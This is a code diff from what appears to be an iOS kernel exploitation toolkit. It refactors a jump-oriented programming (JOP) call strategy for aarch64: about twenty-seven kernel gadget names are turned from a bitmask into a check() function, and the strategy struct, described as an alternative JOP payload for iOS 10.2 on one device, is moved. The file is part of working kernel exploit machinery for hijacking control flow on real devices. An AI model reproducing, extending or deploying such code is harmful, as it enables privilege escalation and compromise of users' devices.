@@ -9,52 +9,42 @@
 #include "aarch64/jop/call_strategy.h"
 #include "aarch64/jop/gadgets_static.h"
 
-#define NEED(block, gadget)	((uint64_t)1 << (gadget - 64 * block))
-
-static const uint64_t gadgets_0 =
-	  NEED(0, LDP_X2_X1_X1__BR_X2)
-	| NEED(0, MOV_X12_X2__BR_X3)
-	| NEED(0, MOV_X2_X30__BR_X12)
-	| NEED(0, MOV_X8_X4__BR_X5)
-	| NEED(0, MOV_X20_X0__BLR_X8)
-	| NEED(0, MOV_X10_X4__BR_X8)
-	| NEED(0, MOV_X9_X10__BR_X8)
-	| NEED(0, MOV_X11_X9__BR_X8)
-	| NEED(0, LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8)
-	| NEED(0, ADD_X20_X20_34__BR_X8)
-	| NEED(0, MOV_X22_X6__BLR_X8)
-	| NEED(0, MOV_X24_X4__BR_X8)
-	| NEED(0, MOV_X0_X3__BLR_X8)
-	| NEED(0, MOV_X0_X5__BLR_X8)
-	| NEED(0, MOV_X9_X0__BR_X11)
-	| NEED(0, MOV_X7_X9__BLR_X11)
-	| NEED(0, MOV_X11_X24__BR_X8)
-	| NEED(0, MOV_X1_X9__MOV_X2_X10__BLR_X11)
-	| NEED(0, LDP_X8_X1_X20_10__BLR_X8)
-	| NEED(0, RET)
-	| NEED(0, MOV_X28_X2__BLR_X8)
-	| NEED(0, MOV_X21_X5__BLR_X8)
-	| NEED(0, MOV_X15_X5__BR_X11)
-	| NEED(0, MOV_X17_X15__BR_X8)
-	| NEED(0, MOV_X30_X22__BR_X17)
-	| NEED(0, STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8)
-	| NEED(0, MOV_X30_X28__BR_X8);
-
-static void build(uint64_t, const uint64_t[8], kaddr_t,
-		void *, struct jop_call_initial_state *, uint64_t *);
-
-/*
- * jop_call_strategy_2
- *
- * Description:
- * 	An alternative JOP payload in case of missing gadgets.
- *
- * Platforms:
- * 	iOS 10.2 14C92: n51
- */
-struct jop_call_strategy jop_call_strategy_2 = {
-	{ gadgets_0 }, 0x400, 0, build,
-};
+static bool
+check() {
+#define NEED(gadget)					\
+	if (static_gadgets[gadget].address == 0) {	\
+		return false;				\
+	}
+	NEED(LDP_X2_X1_X1__BR_X2);
+	NEED(MOV_X12_X2__BR_X3);
+	NEED(MOV_X2_X30__BR_X12);
+	NEED(MOV_X8_X4__BR_X5);
+	NEED(MOV_X20_X0__BLR_X8);
+	NEED(MOV_X10_X4__BR_X8);
+	NEED(MOV_X9_X10__BR_X8);
+	NEED(MOV_X11_X9__BR_X8);
+	NEED(LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8);
+	NEED(ADD_X20_X20_34__BR_X8);
+	NEED(MOV_X22_X6__BLR_X8);
+	NEED(MOV_X24_X4__BR_X8);
+	NEED(MOV_X0_X3__BLR_X8);
+	NEED(MOV_X0_X5__BLR_X8);
+	NEED(MOV_X9_X0__BR_X11);
+	NEED(MOV_X7_X9__BLR_X11);
+	NEED(MOV_X11_X24__BR_X8);
+	NEED(MOV_X1_X9__MOV_X2_X10__BLR_X11);
+	NEED(LDP_X8_X1_X20_10__BLR_X8);
+	NEED(RET);
+	NEED(MOV_X28_X2__BLR_X8);
+	NEED(MOV_X21_X5__BLR_X8);
+	NEED(MOV_X15_X5__BR_X11);
+	NEED(MOV_X17_X15__BR_X8);
+	NEED(MOV_X30_X22__BR_X17);
+	NEED(STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8);
+	NEED(MOV_X30_X28__BR_X8);
+	return true;
+#undef NEED
+}
 
 static void
 build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
@@ -165,3 +155,16 @@ build(uint64_t func, const uint64_t args[8], kaddr_t kernel_payload,
 	// Specify the result address.
 	*result_address = kernel_payload + RESULT_OFFSET;
 }
+
+/*
+ * jop_call_strategy_2
+ *
+ * Description:
+ * 	An alternative JOP payload in case of missing gadgets.
+ *
+ * Platforms:
+ * 	iOS 10.2 14C92: n51
+ */
+struct jop_call_strategy jop_call_strategy_2 = {
+	0x400, 0, check, build,
+};
